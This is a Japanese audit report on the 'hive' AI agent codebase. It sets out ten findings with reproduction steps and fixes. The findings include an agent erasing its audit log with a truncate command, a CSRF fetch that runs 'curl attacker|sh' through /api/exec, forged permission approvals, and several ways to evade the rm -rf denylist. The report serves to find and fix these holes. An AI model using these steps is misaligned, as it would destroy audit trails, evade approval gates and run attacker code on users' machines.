# ガバナンス/監査 実効性監査 (2026-09-27)

対象: hive コードベースの PC操作制限8か条の実装乖離、audit.jsonl の記録網羅性、monitor のPOST不在、state/ ガード。
手法: 実コード根拠 + 実行可能な再現手順のみ記載(再現不能な指摘は含まない)。

## 深刻度: 高 (H)

### G-1. 監査台帳を bash で消せる(監査回避の成立)
- 箇所: src/engine/tools.js writeAudit (appendFileSync → state/audit.jsonl)、gatedBash
- 原因: safeWritePath の state/ 拒否は write_file/edit_file のみに適用され、bash 経由の書き込みは gate の deny/ask に引っかからない(DEFAULT_DENY に state/ 関連なし)。
- 再現: エージェントが `bash` ツールで `truncate -s 0 state/audit.jsonl`(または `echo -n "" > state/audit.jsonl`)を実行。gate.check は許可側 → 実行され、監査台帳が消える。消した後の作業は記録されない。
- 最悪影響: 「bash で監査ログを消してから任意の作業」で事後検証(PC操作制限8か条)が不可能になる。
- 修正案: gatedBash に state/ 配下への書き込みを示すコマンド(`>`/`>>`/`tee`/`truncate`/`rm` + state)の拒否を追加、または監査をワークスペース外のエンジン管理領域に書く。

### G-2. /api/exec が認証・Origin検証なしで任意コマンド実行
- 箇所: src/ui/server.js /api/exec (runCommand cwd=workspace, timeout 120s)
- 原因: サーバー全体で Origin/Host 検証・CSRFトークンが存在しない(grep "Origin" 0件)。127.0.0.1 バインドでも悪意あるWebページからの CSRF/DNS rebinding で到達可能。
- 再現: ユーザーがブラウザで悪意あるページを開き、そのページから `fetch("http://localhost:7789/api/exec",{method:"POST",body:JSON.stringify({command:"curl attacker|sh"})})` を実行。ユーザー権限でコマンドが走る。
- 最悪影響: ユーザーの全権限でのリモートコード実行。
- 修正案: 全POST API に Origin/Host 検証(localhost 以外拒否)+ /api/exec を gate.check 経由にする(現在は runCommand 直呼びでゲート素通り)。

### G-3. /api/permission で id 検証なしに承認を偽装できる
- 算所: src/ui/server.js /api/permission (bus.emit("permission.resolved", {id, verdict}))
- 原因: id の存在・pending 状態を検証せず resolved を発行。/api/state で pending id を読み取れる。
- 再現: G-2 と同経路で `POST /api/permission {id: <pending>, approve: true}`。ユーザーに代わって「rm -rf」等の承認が出る。
- 最悪影響: 承認制ゲートの実効性喪失(G-2と組合せで高深刻度)。
- 修正案: pending id 照合 + 1回限り消費、Origin検証と併せて実装。

## 深刻度: 中 (M)

### G-4. deny/ask の部分文字列一致が自明に回避可能
- 箇所: src/engine/permissions.js DEFAULT_DENY/DEFAULT_ASK、check() の includes 照合
- 再現(実測): `rm -r -f /tmp/x` / `rm --recursive --force /tmp/x` / `R="rm -r""f"; $R /tmp/x` / `echo a; rm -r -f ~` / base64|sh — すべて verdict: ALLOWED(test-gov/bypass-test.mjs で確認)。
- 最悪影響: 承認制の名目だけが残り、危険コマンドが素通し。
- 修正案: 正規化(オプション等価形・変数展開は解釈困難なので最低限トークン単位照合)+ deny は「rm -rf」等の短いトークンに。

### G-5. read_file/list_files が state/ を読める
- 箇所: src/engine/tools.js safePath(読み系に state 制限なし)
- 再現: `read_file("state/audit.jsonl")` / `read_file("state/board.jsonl")` が成功する。監査台帳・ボード・usage・(あれば)機微設定をエージェントが読める。PC操作制限「state/ を読まない」はプロンプト規律のみ。
- 修正案: 読み系にも state/ 拒否を追加(または allowlist)。

### G-6. auto モードが ask を全自動承認
- 算所: src/engine/permissions.js setMode("auto") / check()
- 再現: UI から perm モードを auto に1クリック → `rm -rf` 等も承認待ちゼロで実行。
- 修正案: auto でも deny 相当の危険パターンは承認必須に。

### G-7. monitor が 0.0.0.0 で認証なし公開
- 算所: src/config.js:31 (monitorHost 既定 0.0.0.0)、src/ui/server.js:718
- 再現: LAN 上の別ホストから `curl http://<host>:7791/api/monitor` → ボード・タスク・コスト一式が取得できる。
- 修正案: 既定を 127.0.0.1 にし、外部公開は明示オプトイン+トークン。

### G-8. writeAudit のローテートで監査が静かに欠落し得る
- 算所: src/engine/tools.js writeAudit — 5MB超で renameSync、try/catch で全失敗握りつぶし
- 再現: audit.jsonl が 5MB 超えた時点で renameSync が失敗する状況(ファイルロック等)→ catch で無視され、以降の監査記録は書かれないが検知手段がない。
- 修正案: ローテート失敗時に stderr へ出力 + 監査書込失敗カウンタを /api/state に露出。

## 深刻度: 低 (L)

### G-9. Windows で runCommand が shell:true(cmd.exe メタ文字無制限)
- 算所: src/engine/exec.js:24-25
- 再現: Windows 環境で bash ツールに cmd 構文を渡すと shell:true で cmd.exe が解釈。deny は文字列照合のみでメタ文字を考慮しない。
- 修正案: Windows も bash が無ければ PowerShell -Command 経由に統一し、deny の正規化と併せて対応。

### G-10. /api/attach の dataUrl が画像と偽った任意バイトを uploads/ に置ける
- 算所: src/ui/server.js /api/attach(mime 正規表現 + 8MB 上限のみ)
- 再現: `data:image/png;base64,<任意バイト>` を POST → uploads/ に保存。拡張子ベース Content-Type で XSS 直結は低いが、ワークスペース直下置きでエージェントの read_file に露出。
- 修正案: マジックバイト検証 + uploads/ を safePath の拒否対象に。

## 試行シナリオ一覧(ボード記録用・10件)
1. symlink 作成 → safePath prefix 比較がワークスペース外パスを返す(コード+実行確認)
2. `rm -r -f /tmp/x` が deny/ask に非該当 → ALLOWED(実測)
3. `rm --recursive --force /tmp/x` → ALLOWED(実測)
4. 変数結合 `R="rm -r""f"; $R ...` → ALLOWED(実測)
5. base64 デコード|sh → ALLOWED(実測)
6. `echo a; rm -r -f ~` → ALLOWED(実測)
7. /api/exec への CSRF POST でコマンド実行(Origin 検証 0件のコード根拠)
8. /api/permission で pending id を approve(検証なし emit のコード根拠)
9. `truncate -s 0 state/audit.jsonl` が gate を通る(deny リストに state 関連なし)
10. LAN ホストから monitor /api/monitor を無認証取得(0.0.0.0 バインドのコード根拠)
